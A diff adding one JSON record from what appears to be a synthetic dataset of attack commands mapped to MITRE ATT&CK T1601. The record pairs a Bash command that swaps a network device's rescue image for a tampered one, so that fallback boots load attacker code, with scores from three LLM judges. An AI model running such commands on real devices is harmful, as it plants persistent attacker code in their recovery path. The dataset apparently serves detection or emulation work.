@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1601",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "install -m 0644 /root/rescue_mod.img /mnt/flash/rescue.img && sha256sum /mnt/flash/rescue.img > /mnt/flash/rescue.img.sha256 && diff -u /var/backups/rescue.img.sha256 /mnt/flash/rescue.img.sha256 || true",
+  "explanation": "Replaces the device's rescue image with a malicious variant and records its checksum, ensuring fallback boots load attacker code.",
+  "rationale_steps": [
+    "Swap the recovery/rescue image with a tampered build.",
+    "Generate a checksum artifact to normalize the change.",
+    "Optionally compare to a baseline for tracking modifications."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1601-dc873ff7-974e5fa1",
+  "source_prompt_hash": "dc873ff7",
+  "timestamp_utc": "2025-09-30T04:57:26.660610Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash command list with valid options, separators, and redirection, and intended &&/|| precedence.",
+        "semantic_score": 4,
+        "semantic_justification": "It overwrites a rescue image and records its checksum consistent with modifying an in-storage system image, but it assumes elevated privileges and that the device’s boot/verification process uses these paths without signature enforcement.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-02T20:10:55.368067Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with valid use of &&, ||, proper flag syntax for install and sha256sum, and balanced quoting throughout.",
+        "semantic_score": 4,
+        "semantic_justification": "The command credibly replaces a rescue image with a malicious variant and records its checksum (aligning with T1601 firmware tampering), though the diff against the backup checksum would reveal the mismatch rather than conceal it, slightly undermining the operational stealth intent described.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T01:27:00.405399Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses standard Bash syntax, valid utility flags, and correct logical operators (&&, ||) with no formatting errors.",
+        "semantic_score": 4,
+        "semantic_justification": "The command logically fulfills the technique by overwriting a boot image and updating checksums, though it realistically requires root privileges despite the metadata's 'None' claim.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T01:27:06.513111Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.0,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
